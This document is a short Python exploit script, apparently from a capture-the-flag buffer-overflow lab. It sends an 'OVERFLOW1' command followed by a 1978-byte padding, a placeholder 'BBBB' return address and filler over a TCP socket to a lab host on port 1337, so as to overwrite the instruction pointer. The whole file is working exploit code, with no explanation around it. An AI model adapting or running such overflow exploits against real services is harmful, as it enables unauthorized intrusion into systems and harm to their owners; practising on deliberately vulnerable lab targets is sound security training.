#!/usr/bin/env python3
import socket
import struct

host, port = '10.10.57.175', 1337
command = b'OVERFLOW1 '
length = 5000
offset = 1978
new_eip = b"BBBB"
payload = b''.join(
        [
        command,
        b"A" * offset,
        new_eip,
        b"C" * (length - len(new_eip) - offset),
        ])
with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
